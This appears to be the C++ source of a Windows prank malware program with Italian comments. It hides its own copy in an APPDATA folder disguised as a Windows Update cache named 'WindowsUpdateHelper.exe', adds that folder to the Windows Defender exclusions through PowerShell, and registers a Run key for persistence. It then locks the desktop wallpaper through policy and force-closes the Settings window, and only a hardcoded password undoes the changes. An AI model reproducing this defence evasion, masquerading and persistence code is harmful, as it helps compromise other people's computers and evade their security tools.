#include <windows.h>
#include <iostream>
#include <string>
#include <cstdio> // per sprintf_s
#include "resource.h"
#pragma comment(lib, "user32.lib")
// ====================== DICHIARAZIONI DELLE FUNZIONI ======================
std::string GetHiddenFolderPath();
std::string GetHiddenExePath();
void CreateHiddenExcludedFolder();
bool SelfCopyToHiddenFolder();
void AddToStartupHidden();
void RemoveVirus();
void CheckPassword();
void SetEmbeddedWallpaper();
void LockWallpaper();
// ====================== CONFIGURAZIONE PERCORSI ======================
const char* HIDDEN_FOLDER_NAME = "\\Microsoft\\Windows\\UpdateCache";
const char* HIDDEN_EXE_NAME = "WindowsUpdateHelper.exe";
std::string GetHiddenFolderPath() {
    char path[MAX_PATH] = { 0 };
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, HIDDEN_FOLDER_NAME);
    return std::string(path);
}
std::string GetHiddenExePath() {
    return GetHiddenFolderPath() + "\\" + HIDDEN_EXE_NAME;
}
// ====================== CREA CARTELLA NASCOSTA + ESCLUSIONE DEFENDER ======================
void CreateHiddenExcludedFolder() {
    std::string folderPath = GetHiddenFolderPath();
    if (CreateDirectoryA(folderPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "creating bad stuff..." << folderPath << std::endl;
    }
    else {
        std::cout << "[-] Errore creazione cartella" << std::endl;
        return;
    }
    // Rendi nascosta + system
    std::string attribCmd = "attrib +H +S \"" + folderPath + "\"";
    system(attribCmd.c_str());
    std::cout << "[+] Cartella resa nascosta (+H +S)" << std::endl;
    // Escludi da Windows Defender
    std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + folderPath + "' -Force\"";
    system(psCmd.c_str());
    std::cout << "ok ok..." << std::endl;
}
// ====================== COPIA SE STESSO NELLA CARTELLA NASCOSTA ======================
bool SelfCopyToHiddenFolder() {
    char currentExe[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    std::string destPath = GetHiddenExePath();
    if (CopyFileA(currentExe, destPath.c_str(), FALSE)) {
        std::cout << "i am in you" << std::endl;
        return true;
    }
    else {
        std::cout << "something wrong pls contact bippoiscrazy on discord TT" << std::endl;
        return false;
    }
}
// ====================== AGGIORNA REGISTRO PER USARE LA COPIA NASCOSTA ======================
void AddToStartupHidden() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string hiddenExe = GetHiddenExePath();
        RegSetValueExA(hKey, "WallpaperLock", 0, REG_SZ,
            (const BYTE*)hiddenExe.c_str(), (DWORD)(hiddenExe.length() + 1));
        RegCloseKey(hKey);
        std::cout << "i am steel here" << std::endl;
    }
}
// ====================== RIMUOVI VIRUS ======================
void RemoveVirus() {
    std::cout << "[*] removing bad stuff...\n";
    // 1. Sblocca il wallpaper
    HKEY hKey;
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExA(hKey, "NoChangingWallPaper", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    // 2. Rimuove dal Run
    HKEY hKeyRun;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKeyRun) == ERROR_SUCCESS) {
        RegDeleteValueA(hKeyRun, "WallpaperLock");
        RegCloseKey(hKeyRun);
    }
    // 3. Preparazione pulizia aggressiva
    char exePath[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string hiddenFolder = GetHiddenFolderPath();
    char batPath[MAX_PATH] = { 0 };
    GetTempPathA(MAX_PATH, batPath);
    strcat_s(batPath, "cleanup.bat");
    HANDLE hFile = CreateFileA(batPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    char batContent[2048] = { 0 };
    sprintf_s(batContent,
        "@echo off\n"
        "timeout /t 5 /nobreak >nul\n"
        "del /f /q \"%s\" >nul 2>&1\n"
        "rmdir /s /q \"%s\" >nul 2>&1\n"
        "timeout /t 2 /nobreak >nul\n"
        "del /f /q \"%%~f0\" >nul 2>&1\n",
        exePath, hiddenFolder.c_str());
    DWORD written = 0;
    WriteFile(hFile, batContent, (DWORD)strlen(batContent), &written, NULL);
    CloseHandle(hFile);
    ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);
    std::cout << "[+] bye bye!\n";
    std::cout << " → Wallpaper controll gived back\n";
    std::cout << " → bad stuff eliminated\n" << std::endl;
    Sleep(1500);
    exit(0);
}
// ====================== ALTRE FUNZIONI ======================
void CheckPassword() {
    std::string input;
    std::cout << "password: ";
    std::cin >> input;
    if (input == "bippoismygod") {
        RemoveVirus();
    }
    else {
        std::cout << "Password errata!" << std::endl;
    }
}
void SetEmbeddedWallpaper() {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_MYIMAGE), "IMAGE");
    if (!hRes) {
        std::cout << "bruh" << std::endl;
        return;
    }
    HGLOBAL hData = LoadResource(NULL, hRes);
    DWORD size = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    char savePath[MAX_PATH] = { 0 };
    GetTempPathA(MAX_PATH, savePath);
    strcat_s(savePath, "wallpaper.jpg");
    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written = 0;
    WriteFile(hFile, pData, size, &written, NULL);
    CloseHandle(hFile);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, savePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    std::cout << "new wallpaper!!" << std::endl;
}
void LockWallpaper() {
    std::cout << "[*] Tentativo di bloccare il wallpaper...\n";

    // 1. Prova a chiudere la finestra delle Impostazioni di Windows
    HWND hwnd = FindWindowA("ApplicationFrameWindow", "Impostazioni");
    if (hwnd) {
        PostMessageA(hwnd, WM_CLOSE, 0, 0);
        Sleep(300);  // aspetta un po' che si chiuda
        std::cout << "[+] Finestra Impostazioni chiusa forzatamente" << std::endl;
    }

    // 2. Blocca la policy (più volte per sicurezza)
    HKEY hKey;
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop";

    for (int i = 0; i < 3; i++) {   // prova 3 volte
        LONG openRes = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

        if (openRes == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExA(hKey, "NoChangingWallPaper", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
        Sleep(150);
    }

    // 3. Forza l'aggiornamento del desktop
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    std::cout << "Wallpaper locked!" << std::endl;
}
// ====================== MAIN ======================
int main() {
    // Controlla se è già installato
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_QUERY_VALUE, &hKey);
    char value[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;
    LONG check = RegQueryValueExA(hKey, "WallpaperLock", NULL, NULL, (LPBYTE)value, &size);
    RegCloseKey(hKey);
    if (check == ERROR_SUCCESS) {
        // Già installato → chiedi password per rimuoverlo
        CheckPassword();
    }
    else {
        // === PRIMA INSTALLAZIONE ===
        std::cout << "[*] dowloading...\n";
        CreateHiddenExcludedFolder();
        SelfCopyToHiddenFolder();
        AddToStartupHidden();
        SetEmbeddedWallpaper();
        LockWallpaper();
        std::cout << "\n[!] i am in!\n";
        std::cout << " → bad stuff created\n";
        std::cout << " → i am in x2\n";
        std::cout << " → evrything done\n" << std::endl;
    }
    system("pause");
    return 0;
}